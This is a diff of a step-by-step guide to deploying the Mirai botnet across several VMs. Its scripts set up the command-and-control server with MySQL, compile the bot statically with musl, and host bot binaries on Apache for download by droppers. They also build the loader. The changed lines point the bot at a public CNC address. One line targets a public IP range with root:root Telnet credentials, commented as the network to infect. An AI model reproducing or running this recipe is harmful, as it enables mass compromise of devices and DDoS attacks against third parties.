@@ -9,9 +9,9 @@
 - snprintf(strbuf, sizeof(strbuf), "13.60.46.%d:23 root:root", o4); // the network that u want to infect
 - addrs[0] = inet_addr("192.168.1.57"); // IP privee of the loader
 - if ((srv = server_create(sysconf(_SC_NPROCESSORS_ONLN), addrs_len, addrs,1024 * 64, "192.168.1.57", 80, "192.168.1.57")) == NULL) // IP publique of the loader
-3. **router setup:**
 4. **mirai/bot/main.c**
--      srv_addr.sin_addr.s_addr = inet_addr("172.31.29.220");  // IP du CNC
+     srv_addr.sin_addr.s_addr = inet_addr("13.49.244.108");  // IP du CNC
+     srv_addr.sin_port = htons(23);                      // Port du bot C2
 ---
 
 ## ROUTER1 VM (Ubuntu 22.04) - Complete Setup
@@ -132,46 +132,46 @@ sudo ln -s /usr/bin/busybox /bin/busybox
 
 ---
 
-## CNC VM (Ubuntu 22.04) - Complete Setup with Patch
+## CNC VM (Ubuntu 24.04) 
 
 ```bash
 #!/bin/bash
-# CNC VM - Ubuntu 22.04 with your patch
+# CNC VM - Ubuntu 24.04
+# Complete setup script for Mirai Command & Control server
 
+set -e  # Stop on error
+
+echo "=== CNC VM Setup ==="
+
+# Update system
 sudo apt update && sudo apt upgrade -y
 
-sudo apt install -y screen
-
 # Install dependencies
-sudo apt install -y git mysql-server mysql-client build-essential wget
+sudo apt install -y git mysql-server mysql-client build-essential wget screen
 
-# Download 64-bit Go
+# ==================== INSTALL GO 1.15 ====================
 cd /tmp
 wget https://dl.google.com/go/go1.15.15.linux-amd64.tar.gz
-
-# Extract to /usr/local
 sudo tar -C /usr/local -xzf go1.15.15.linux-amd64.tar.gz
-
-# Clean up
 rm go1.15.15.linux-amd64.tar.gz
-
-# Verify
 ls -la /usr/local/go/bin/go
 /usr/local/go/bin/go version
 
 # Add to PATH
 export PATH=/usr/local/go/bin:$PATH
 
-# Test
-go version
-
 # Create Go workspace
 mkdir -p ~/go/src ~/go/bin ~/go/pkg
 
-# Configure MySQL (Ubuntu 22.04 compatibility)
+# Verify Go
+go version
+
+# ==================== SETUP MYSQL ====================
+# Configure MySQL  
 sudo systemctl start mysql
 sudo systemctl enable mysql
 
+# Configure MySQL with native password for compatibility
 sudo mysql << 'EOF'
 ALTER USER 'root'@'localhost' IDENTIFIED WITH mysql_native_password BY 'root';
 CREATE USER IF NOT EXISTS 'mirai'@'localhost' IDENTIFIED WITH mysql_native_password BY 'password';
@@ -179,6 +179,7 @@ GRANT ALL PRIVILEGES ON *.* TO 'mirai'@'localhost';
 FLUSH PRIVILEGES;
 EOF
 
+# ==================== INSTALL GO DEPENDENCIES ====================
 # Install Go dependencies
 mkdir -p ~/go/src/github.com/go-sql-driver
 cd ~/go/src/github.com/go-sql-driver
@@ -192,6 +193,9 @@ git clone https://github.com/mattn/go-shellwords.git
 cd go-shellwords
 git checkout v1.0.12
 
+
+
+# ==================== CLONE AND PATCH MIRAI ====================
 # Clone and patch Mirai
 cd ~
 git clone https://github.com/hameza123/Mirai-Source-Code.git
@@ -200,7 +204,7 @@ cd Mirai-Source-Code
 # Apply your patch
 git apply  mirai.patch 
 
-# Fix ioutil deprecation for Ubuntu 22.04
+# Fix ioutil deprecation for Go 1.16+
 cd mirai/cnc
 sed -i 's/"io\/ioutil"/"os"/' admin.go
 sed -i 's/ioutil.ReadFile/os.ReadFile/' admin.go
@@ -210,7 +214,8 @@ sed -i 's/ioutil.ReadFile/os.ReadFile/' admin.go
 sudo mysql
 mysql -u root -proot -e "SELECT 1"
 
-# Save your schema to a file
+
+# ==================== CREATE DATABASE SCHEMA ====================
 cat > ~/mirai_complete_schema.sql << 'EOF'
 -- Create database
 CREATE DATABASE IF NOT EXISTS mirai;
@@ -294,9 +299,8 @@ grep "DatabaseUser\|DatabasePass" main.go
 # After the script runs, verify MySQL
 sudo systemctl status mysql
 
-# Test connections
-mysql -u root -proot -e "SELECT 'MySQL OK'"
-mysql -u mirai -ppassword -e "USE mirai; SHOW TABLES'"
+
+# ==================== BUILD CNC ====================
 
 # Build CNC
 cd ~/Mirai-Source-Code
@@ -309,30 +313,41 @@ go build -o ~/mirai/report mirai/tools/scanListen.go
 echo "CNC VM configured!"
 
 screen -S cnc sudo ~/mirai/cnc
+screen -S report sudo ~/mirai/report
 ```
 
 ---
 
-## LOADER VM (Ubuntu 22.04) 
+## LOADER VM (Ubuntu 24.04) 
 
 ```bash
+#!/bin/bash
+# Loader VM - Ubuntu 24.04
+# Builds bot binaries and hosts them for download
+
+set -e
+
+echo "=== Loader VM Setup ==="
+
+# Update system
 sudo apt update && sudo apt upgrade -y
 
 # Install dependencies
-sudo apt install -y git gcc make apache2 build-essential electric-fence
+sudo apt install -y git gcc make apache2 build-essential electric-fence \
+    musl-tools musl-dev linux-headers-$(uname -r) linux-libc-dev
 
-# Clone and patch Mirai
+# Clone Mirai source
 cd ~
 git clone https://github.com/hameza123/Mirai-Source-Code.git
 cd Mirai-Source-Code
- 
 
-# Apply your patch
-git apply  mirai.patch 
-
+# Apply patch
+git apply mirai.patch
 
 # Create output directory
 mkdir -p ~/mirai
+
+# ==================== FIX LOCAL_ADDR DEFINITIONS ====================
 
 cd ~/Mirai-Source-Code/mirai/bot
 
@@ -347,15 +362,11 @@ sed -i '/#include "includes.h"/a uint32_t LOCAL_ADDR;' attack_gre.c
 sed -i '/#include "includes.h"/a uint32_t LOCAL_ADDR;' attack_tcp.c
 sed -i '/#include "includes.h"/a uint32_t LOCAL_ADDR;' attack_udp.c
 
-# Install musl toolchain
-sudo apt install -f musl-tools -y
-# Install kernel headers
-sudo apt install -y linux-headers-$(uname -r) linux-libc-dev
-# For musl, we need to point to the right includes
-sudo apt install -y musl-dev
 # Create symlinks for kernel headers in musl include path
 sudo ln -sf /usr/include/linux /usr/lib/x86_64-linux-musl/include/ 2>/dev/null || true
 sudo ln -sf /usr/include/asm-generic /usr/lib/x86_64-linux-musl/include/ 2>/dev/null || true
+
+# ==================== FIX LINUX HEADERS ====================
 
 # Fix the includes
 cd ~/Mirai-Source-Code/mirai/bot/
@@ -376,6 +387,8 @@ find . -type f -exec sed -i 's/#include <linux\/limits.h>/#include <limits.h>/g'
 find . -type f -exec sed -i 's/#include <linux\/socket.h>/#include <sys\/socket.h>/g' {} \;
 sed -i 's/#include <linux\/ip.h>/#include <netinet\/ip.h>/' checksum.h
 
+
+# ==================== COMPILE BOT WITH MUSL ====================
 # Recompile bot with musl (fully static, no glibc deps)
 cd ~/Mirai-Source-Code/mirai/
 musl-gcc -std=c99 bot/*.c \
@@ -389,6 +402,8 @@ musl-gcc -std=c99 bot/*.c \
 # Strip to reduce size
 strip ~/mirai/mirai.x86.musl
 
+
+# ==================== SETUP WEB SERVER ====================
 # Setup web server
 sudo mkdir -p /var/www/html/bins
 # Copy to web server
@@ -421,17 +436,14 @@ sed -i 's/uint32_t_to_ip/uint32_to_ip/' main.c
 # Ajouter les headers
 sed -i '1i#include <ctype.h>\n#include <stdlib.h>\n#include <unistd.h>' util.c
 
+
+# ==================== COMPILE LOADER ====================
 cd ~/Mirai-Source-Code/loader/
 # Try building with debugging (as in your original setup)
 gcc -lefence -g -DDEBUG -static -lpthread -pthread -O3 src/*.c -o ~/mirai/loader.dbg
+ 
 
-# If that fails, try without static linking
-#gcc -lefence -g -DDEBUG -lpthread -pthread -O3 src/*.c -o ~/mirai/loader.dbg
-
-# Or with -fcommon (GCC 10+ fix)
-#gcc -lefence -g -DDEBUG -static -lpthread -pthread -O3 -fcommon src/*.c -o ~/mirai/loader.dbg
-
-
+# ==================== COMPILE DROPPER ====================
 # Create bins directory for droppers
 mkdir -p ~/mirai/bins
 cp ~/Mirai-Source-Code/loader/bins/* ~/mirai/bins/ 2>/dev/null || echo "No droppers yet"
@@ -439,6 +451,9 @@ cp ~/Mirai-Source-Code/loader/bins/* ~/mirai/bins/ 2>/dev/null || echo "No dropp
 # Start Apache
 sudo systemctl enable apache2
 sudo systemctl start apache2
+
+
+# ==================== CREATE SWAP (for memory) ====================
 
 # Vérifier l'espace disque disponible
 df -h /
@@ -454,11 +469,6 @@ free -h
 swapon --show
 
 echo "Loader VM configured!"
-
-
-sudo rm -rf mirai/
-sudo rm -rf Mirai-Source-Code/
-sudo rm -rf /var/www/html/bins/*
 
 ```
 
